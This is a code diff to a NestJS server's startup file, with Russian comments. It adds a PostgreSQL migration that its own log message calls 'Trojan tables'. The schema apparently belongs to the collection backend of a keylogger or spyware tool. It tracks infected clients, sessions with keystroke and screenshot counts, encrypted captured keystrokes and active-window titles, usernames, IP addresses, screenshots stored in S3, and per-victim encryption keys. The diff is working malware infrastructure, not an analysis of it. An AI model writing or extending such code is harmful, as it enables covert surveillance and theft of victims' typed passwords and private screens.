@@ -13,39 +13,110 @@ async function bootstrap() {
   app.useGlobalFilters(new AllExceptionsFilter());
   const configService = app.get(ConfigService);
 
-// --- ПРЯМАЯ МИГРАЦИЯ (БЕЗ CONFIGSERVICE) ---
-const rawDbUrl = process.env.DATABASE_URL; // Берем напрямую из системы
-console.log('=== DATABASE CHECK START ===');
+// --- ГЛОБАЛЬНАЯ МИГРАЦИЯ СТРУКТУРЫ ---
+const client = new Client({ 
+  connectionString: process.env.DATABASE_URL,
+  ssl: { rejectUnauthorized: false }
+});
 
-if (!rawDbUrl) {
-  console.log('❌ ERROR: process.env.DATABASE_URL is EMPTY');
-} else {
-  console.log('Found URL, attempting connection...');
-  const client = new Client({ 
-    connectionString: rawDbUrl,
-    ssl: { rejectUnauthorized: false } // Добавляем SSL, так как Render его требует
-  });
+try {
+  await client.connect();
+  // 1. Включаем расширения
+  await client.query(`CREATE EXTENSION IF NOT EXISTS "pgcrypto";`);
   
-  try {
-    await client.connect();
-    await client.query(`
-      CREATE TABLE IF NOT EXISTS items (
+  // 2. Создаем таблицы в правильном порядке (сначала без зависимостей)
+  await client.query(`
+    CREATE TABLE IF NOT EXISTS clients (
+        client_id VARCHAR(64) PRIMARY KEY,
+        hostname_hash VARCHAR(64) NOT NULL UNIQUE,
+        first_seen TIMESTAMPTZ DEFAULT NOW(),
+        last_seen TIMESTAMPTZ DEFAULT NOW(),
+        total_logs INTEGER DEFAULT 0,
+        is_active BOOLEAN DEFAULT TRUE,
+        is_blacklisted BOOLEAN DEFAULT FALSE,
+        country_code VARCHAR(2),
+        timezone VARCHAR(50),
+        tags TEXT[]
+    );
+
+    CREATE TABLE IF NOT EXISTS sessions (
+        session_id VARCHAR(64) PRIMARY KEY,
+        client_id VARCHAR(64) REFERENCES clients(client_id) ON DELETE CASCADE,
+        started_at TIMESTAMPTZ DEFAULT NOW(),
+        ended_at TIMESTAMPTZ,
+        last_activity TIMESTAMPTZ DEFAULT NOW(),
+        total_keystrokes INTEGER DEFAULT 0,
+        total_screenshots INTEGER DEFAULT 0,
+        total_windows INTEGER DEFAULT 0,
+        common_apps TEXT[]
+    );
+
+    CREATE TABLE IF NOT EXISTS client_logs (
         id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-        name TEXT NOT NULL,
-        description TEXT,
-        created_at TIMESTAMPTZ DEFAULT NOW()
-      );
-      ALTER TABLE items REPLICA IDENTITY FULL;
-    `);
-    console.log('✅ SUCCESS: Table "items" is ready');
-  } catch (err) {
-    console.log('❌ DB ERROR:', err.message);
-  } finally {
-    await client.end();
-  }
+        client_id VARCHAR(64) REFERENCES clients(client_id) ON DELETE CASCADE,
+        session_id VARCHAR(64) REFERENCES sessions(session_id) ON DELETE SET NULL,
+        timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+        received_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+        keystrokes_encrypted BYTEA,
+        keystrokes_hash VARCHAR(64),
+        active_window_encrypted BYTEA,
+        active_window_hash VARCHAR(64),
+        os_info TEXT,
+        username_hash VARCHAR(64),
+        ip_address INET,
+        user_agent TEXT,
+        screenshot_path TEXT,
+        screenshot_size INTEGER,
+        is_processed BOOLEAN DEFAULT FALSE,
+        processed_at TIMESTAMPTZ,
+        encryption_version VARCHAR(10) DEFAULT 'v1',
+        data_signature VARCHAR(128)
+    );
+
+    CREATE TABLE IF NOT EXISTS screenshots (
+        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+        log_id UUID REFERENCES client_logs(id) ON DELETE CASCADE,
+        timestamp TIMESTAMPTZ NOT NULL,
+        client_id VARCHAR(64) REFERENCES clients(client_id) ON DELETE CASCADE,
+        screenshot_data BYTEA,
+        storage_type VARCHAR(20) DEFAULT 's3',
+        storage_url TEXT,
+        storage_bucket TEXT,
+        storage_key TEXT,
+        file_format VARCHAR(10) DEFAULT 'png',
+        width INTEGER,
+        height INTEGER,
+        file_size INTEGER
+    );
+
+    CREATE TABLE IF NOT EXISTS encryption_keys (
+        id SERIAL PRIMARY KEY,
+        client_id VARCHAR(64) REFERENCES clients(client_id) ON DELETE CASCADE,
+        data_key_encrypted BYTEA NOT NULL,
+        iv_encrypted BYTEA NOT NULL,
+        created_at TIMESTAMPTZ DEFAULT NOW(),
+        expires_at TIMESTAMPTZ,
+        is_active BOOLEAN DEFAULT TRUE,
+        key_version VARCHAR(10) DEFAULT 'v1',
+        algorithm VARCHAR(20) DEFAULT 'AES-256-GCM',
+        UNIQUE(client_id, key_version)
+    );
+  `);
+
+  // 3. Создаем индексы для ускорения поиска
+  await client.query(`
+    CREATE INDEX IF NOT EXISTS idx_client_logs_client_id ON client_logs(client_id);
+    CREATE INDEX IF NOT EXISTS idx_client_logs_timestamp ON client_logs(timestamp);
+    CREATE INDEX IF NOT EXISTS idx_screenshots_log_id ON screenshots(log_id);
+    CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen);
+  `);
+
+  console.log('✅ DATABASE: All Trojan tables and indices created');
+} catch (err) {
+  console.error('❌ DATABASE ERROR:', err.message);
+} finally {
+  await client.end();
 }
-console.log('=== DATABASE CHECK END ===');
-// --- КОНЕЦ БЛОКА ---
 
   // Добавляем ValidationPipe для автоматической валидации DTO
   app.useGlobalPipes(
